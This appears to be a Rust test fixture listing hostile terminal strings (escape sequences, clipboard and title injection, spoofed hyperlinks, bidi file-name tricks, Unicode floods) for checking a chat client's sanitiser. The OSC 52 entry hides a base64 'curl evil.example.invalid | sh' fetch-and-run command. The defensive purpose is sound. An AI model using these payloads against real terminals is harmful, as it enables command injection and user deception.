//! Hostile strings: text a remote party could send to break or take over a terminal. The demo
//! channel `hostile-strings` carries them as message text, and the sanitiser's tests feed them
//! in, so nothing remote is ever drawn before it is proven harmless.
//!
//! Each entry names what it attacks. Escape sequences are spelled with `\x1b` (7-bit) and
//! `\u{9b}`-style C1 code points (8-bit), since terminals honour both.

/// One hostile string and what it tries.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Hostile {
    pub what: &'static str,
    pub text: String,
}

fn h(what: &'static str, text: impl Into<String>) -> Hostile {
    Hostile { what, text: text.into() }
}

/// Every hostile string, in a fixed order.
pub fn all() -> Vec<Hostile> {
    vec![
        h("CSI: clear the screen and home the cursor", "before\x1b[2J\x1b[Hafter"),
        h("CSI: move the cursor and erase the line", "a\x1b[10;10H\x1b[2Kb\x1b[5Ac"),
        h("SGR: colours that leak into later cells", "\x1b[31;1;5mred blinking\x1b[0m and \x1b[38;2;255;0;0mtruecolor"),
        h("DEC private modes: leave the alternate screen, hide the cursor", "\x1b[?1049l\x1b[?25l\x1b[?1000l"),
        h("OSC 0: set the window title", "\x1b]0;owned title\x07visible"),
        h("OSC 52: write the clipboard", "\x1b]52;c;Y3VybCBldmlsLmV4YW1wbGUuaW52YWxpZCB8IHNo\x07"),
        h(
            "OSC 8: a hyperlink whose text hides its target",
            "\x1b]8;;https://evil.example.invalid/\x1b\\docs.example.com\x1b]8;;\x1b\\",
        ),
        h("DCS: a device control string", "\x1bP+q544e\x1b\\after dcs"),
        h("APC: a kitty graphics command", "\x1b_Ga=T,f=100;iVBORw0KGgo=\x1b\\after apc"),
        h("8-bit C1 CSI and OSC", "\u{9b}31mc1 red\u{9b}0m \u{9d}0;c1 title\u{9c}"),
        h("a lone ESC at the end", "dangling\x1b"),
        h("C0 controls: NUL, BEL, BS, VT, FF, DEL", "a\x00b\x07c\x08d\x0be\x0cf\x7fg"),
        h("carriage return overwriting the start of the line", "innocent text\rEVIL"),
        h("tabs and line breaks inside one message", "col1\tcol2\tcol3\nline two\r\nline three"),
        h("bidi override: the file name reads backwards", "invoice_\u{202E}fdp.exe\u{202C} attached"),
        h("bidi isolates and marks left open", "\u{2067}\u{2066}\u{200F}\u{200E}open isolates"),
        h("zero-width flood", format!("a{}b", "\u{200B}".repeat(1000))),
        h("zero-width joiners, non-joiners and BOMs", "x\u{200D}\u{200C}\u{FEFF}\u{2060}y"),
        h("combining mark flood", format!("e{}", "\u{0301}\u{0336}".repeat(250))),
        h("variation selectors and tag characters", "\u{2764}\u{FE0F}\u{FE0E}\u{E0041}\u{E0042}\u{E007F}"),
        h("a 100 kB line without spaces", "x".repeat(100 * 1024)),
        h(
            "malformed UTF-8, replaced on decode",
            String::from_utf8_lossy(b"ok \xff\xfe\xc3\x28 \xe2\x82 end").into_owned(),
        ),
        h("private use and unassigned code points", "\u{E000}\u{F8FF}\u{10FFFF}\u{FFFE}"),
        h("line and paragraph separators", "one\u{2028}two\u{2029}three"),
        h(
            "wide characters and emoji sequences next to each other",
            "\u{D55C}\u{AE00}\u{1F469}\u{200D}\u{1F4BB}\u{1F44D}\u{1F3FD}\u{1F1F0}\u{1F1F7}",
        ),
    ]
}

#[cfg(test)]
mod tests;
